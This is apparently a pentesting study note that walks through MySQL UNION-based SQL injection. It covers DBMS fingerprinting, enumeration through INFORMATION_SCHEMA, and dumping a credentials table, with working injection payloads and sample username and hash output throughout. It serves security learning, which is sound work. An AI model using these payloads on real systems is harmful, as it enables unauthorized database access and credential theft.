# SQL Injection – Database Enumeration (MySQL)

## Purpose

Once UNION injection works, the next step is **database enumeration**.

Goal:

1. identify DBMS type
2. list databases
3. list tables
4. list columns
5. extract sensitive data

We use the **INFORMATION_SCHEMA** database to retrieve metadata about the DBMS structure.

---

# Step 1 – DBMS Fingerprinting

Before enumeration, we must identify the **database type**.

Different DBMS use different syntax.

Example:

| DBMS | syntax differences |
|------|-------------------|
| MySQL | @@version |
| MSSQL | @@version but different functions |
| Oracle | banner queries |
| PostgreSQL | version() |

---

# MySQL Fingerprinting Techniques

## 1. Version Query

```sql
SELECT @@version
```

Example injection:

```
cn' UNION select 1,@@version,3,4-- -
```

Example output:

```
10.3.22-MariaDB-1ubuntu1
```

MariaDB is MySQL-compatible.

---

## 2. Numeric-based fingerprint

Useful when only numbers are returned.

```sql
SELECT POW(1,1)
```

Expected output:

```
1
```

---

## 3. Time-based fingerprint

Useful in blind SQLi scenarios.

```sql
SELECT SLEEP(5)
```

Result:

- page response delayed by 5 seconds
- confirms MySQL

---

# INFORMATION_SCHEMA Database

INFORMATION_SCHEMA contains metadata about:

- databases
- tables
- columns
- permissions
- constraints

We use it to map database structure.

---

# Database Reference Syntax

Access table from another database using dot notation:

```sql
database_name.table_name
```

Example:

```sql
SELECT * FROM my_database.users;
```

---

# Step 2 – Enumerate Databases

Database names are stored in:

```
INFORMATION_SCHEMA.SCHEMATA
```

Important column:

```
SCHEMA_NAME
```

---

## Manual Query Example

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Example result:

```
mysql
information_schema
performance_schema
ilfreight
dev
```

---

## Default Databases

Usually ignored:

```
mysql
information_schema
performance_schema
sys
```

Interesting targets:

```
ilfreight
dev
```

---

## SQL Injection Payload

```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

---

# Step 3 – Identify Current Database

Find active database using:

```sql
SELECT database()
```

Injection:

```
cn' UNION select 1,database(),2,3-- -
```

Example result:

```
ilfreight
```

---

# Step 4 – Enumerate Tables

Tables are stored in:

```
INFORMATION_SCHEMA.TABLES
```

Important columns:

| column | purpose |
|--------|--------|
| TABLE_NAME | table name |
| TABLE_SCHEMA | database name |

---

## List Tables in Specific Database

Example payload:

```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 
from INFORMATION_SCHEMA.TABLES 
where table_schema='dev'-- -
```

Example output:

```
credentials
framework
pages
posts
```

Potential target:

```
credentials
```

---

# Step 5 – Enumerate Columns

Column names stored in:

```
INFORMATION_SCHEMA.COLUMNS
```

Important columns:

| column | purpose |
|--------|--------|
| COLUMN_NAME | column name |
| TABLE_NAME | table name |
| TABLE_SCHEMA | database name |

---

## List Columns from credentials table

Injection:

```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA 
from INFORMATION_SCHEMA.COLUMNS 
where table_name='credentials'-- -
```

Example result:

```
username
password
```

---

# Step 6 – Dump Table Data

We now know:

Database:

```
dev
```

Table:

```
credentials
```

Columns:

```
username
password
```

---

## Data Extraction Query

```
cn' UNION select 1,username,password,4 
from dev.credentials-- -
```

Result:

```
admin | 5f4dcc3b5aa765d61d8327deb882cf99
john  | e99a18c428cb38d5f260853678922e03
api_user | 8f14e45fceea167a5a36dedd4bea2543
```

Sensitive data retrieved.

---

# Full Enumeration Workflow

## 1 – confirm DBMS type

```
' UNION SELECT 1,@@version,3,4-- -
```

---

## 2 – enumerate databases

```
' UNION SELECT 1,schema_name,3,4 
FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

---

## 3 – identify current database

```
' UNION SELECT 1,database(),3,4-- -
```

---

## 4 – enumerate tables

```
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 
FROM INFORMATION_SCHEMA.TABLES 
WHERE table_schema='dev'-- -
```

---

## 5 – enumerate columns

```
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE table_name='credentials'-- -
```

---

## 6 – dump data

```
' UNION SELECT 1,username,password,4 
FROM dev.credentials-- -
```

---

# INFORMATION_SCHEMA Cheat Sheet

## List databases

```sql
SELECT SCHEMA_NAME 
FROM INFORMATION_SCHEMA.SCHEMATA;
```

---

## List tables

```sql
SELECT TABLE_NAME 
FROM INFORMATION_SCHEMA.TABLES 
WHERE table_schema='database_name';
```

---

## List columns

```sql
SELECT COLUMN_NAME 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE table_name='table_name';
```

---

## Dump data

```sql
SELECT column1,column2 
FROM database.table;
```

---

# Key Takeaways

- identifying DBMS type determines correct syntax
- INFORMATION_SCHEMA provides database structure metadata
- enumeration occurs in stages
- schema → tables → columns → data
- dot operator required when accessing other databases
- UNION injection allows structured data extraction

---

# Quick Reference

## identify MySQL

```
@@version
POW(1,1)
SLEEP(5)
```

---

## list databases

```
INFORMATION_SCHEMA.SCHEMATA
```

---

## list tables

```
INFORMATION_SCHEMA.TABLES
```

---

## list columns

```
INFORMATION_SCHEMA.COLUMNS
```

---

## dump data

```
database.table
```

---

# Tags

#sql-injection  
#database-enumeration  
#mysql  
#information_schema  
#union-injection  
#data-extraction  
#web-security  
#pentesting  
#obsidian